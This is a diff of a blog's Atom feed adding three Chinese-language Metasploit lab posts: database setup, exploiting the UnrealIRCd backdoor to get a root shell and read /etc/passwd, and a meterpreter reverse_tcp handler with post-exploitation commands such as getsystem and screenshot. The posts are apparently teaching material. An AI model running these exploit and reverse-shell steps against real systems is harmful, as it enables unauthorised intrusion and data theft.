@@ -6,7 +6,7 @@
   <link href="http://0xchang.github.io/atom.xml" rel="self"/>
   
   <link href="http://0xchang.github.io/"/>
-  <updated>2021-12-20T12:50:13.507Z</updated>
+  <updated>2021-12-21T08:12:01.183Z</updated>
   <id>http://0xchang.github.io/</id>
   
   <author>
@@ -15,6 +15,72 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>metasploit之PostgreSQL</title>
+    <link href="http://0xchang.github.io/2021/12/21/metasploit%E4%B9%8BPostgreSQL/"/>
+    <id>http://0xchang.github.io/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</id>
+    <published>2021-12-21T04:24:10.000Z</published>
+    <updated>2021-12-21T08:12:01.183Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p><p><code>db_connect</code>  链接数据库</p><p><code>db_disconnect</code>    断开连接</p><p><code>vulns</code>     查看数据库扫描的主机的漏洞</p><p><code>workspace</code>   工作空间，相对于独立的</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p><p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p><p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p><p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p><p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p><p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p><p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p><p>退出msf，执行<code>su postgres</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p><p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p><p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p><p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p><p>找到59行，将#去掉，并且把localhost改为*，88行去掉#,然后保存退出</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p><p>编辑/etc/postgresql/9.5/main/pg_hba.conf,最后一行添加host all all 0.0.0.0/32 md5，保存退出</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p><p>service postgresql restart，重启服务</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p><p>打开msf，workspace –help查看用法</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p><p>workspace -v查看工作空间，只有默认的一个</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p><p>worksapce -a 1,workspace -a 2 添加工作空间1，2，执行workspace -v 查看工作空间</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p><p>workspace -d 1删除工作空间1，执行workspace -v 查看现有工作空间</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p><p>workspace 2切换到工作空间2</p><p>workspace -d 2删除工作空间2,自动切换到默认工作空间</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;metasploit之PostgreSQL&quot;&gt;&lt;a href=&quot;#metasploit之PostgreSQL&quot; class=&quot;headerlink&quot; title=&quot;metasploit之PostgreSQL&quot;&gt;&lt;/a&gt;metasploit之PostgreSQL&lt;/</summary>
+      
+    
+    
+    
+    
+    <category term="msf PostgreSQL" scheme="http://0xchang.github.io/tags/msf-PostgreSQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>metasploit溢出UnrealIRCd后门漏洞</title>
+    <link href="http://0xchang.github.io/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://0xchang.github.io/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</id>
+    <published>2021-12-21T04:23:58.000Z</published>
+    <updated>2021-12-21T05:09:49.892Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p><p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p><p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p><p>输入show options,查看需要设置的相关选项<br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p><p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p><p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p><p>本机4444端口建立远程会话</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;metasploit溢出UnrealIRCd后门漏洞&quot;&gt;&lt;a href=&quot;#metasploit溢出UnrealIRCd后门漏洞&quot; class=&quot;headerlink&quot; title=&quot;metasploit溢出UnrealIRCd后门漏洞&quot;&gt;&lt;/a&gt;metasplo</summary>
+      
+    
+    
+    
+    
+    <category term="metasploit unrealircd 后门 漏洞" scheme="http://0xchang.github.io/tags/metasploit-unrealircd-%E5%90%8E%E9%97%A8-%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>metasploit之meterpreter命令</title>
+    <link href="http://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/"/>
+    <id>http://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</id>
+    <published>2021-12-21T04:22:46.000Z</published>
+    <updated>2021-12-21T06:51:02.386Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p><p>输入<code>exploit -j</code>运行脚本，且在后台监听</p><p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p><p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p><p>执行<code>ps</code>查看进程</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p><p><code>getuid</code> 查看权限</p><p><code>pwd</code> 查看当前路径</p><p><code>screentshot</code>截图</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p><p><code>background</code>会话转入后台</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p><p>新建终端，进入/root目录下，查看截图</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p><p>实验结束</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;metasploit之meterpreter命令&quot;&gt;&lt;a href=&quot;#metasploit之meterpreter命令&quot; class=&quot;headerlink&quot; title=&quot;metasploit之meterpreter命令&quot;&gt;&lt;/a&gt;metasploit之met</summary>
+      
+    
+    
+    
+    
+    <category term="msf meterpreter" scheme="http://0xchang.github.io/tags/msf-meterpreter/"/>
+    
+  </entry>
   
   <entry>
     <title>beef+metasploit利用浏览器获取shell</title>
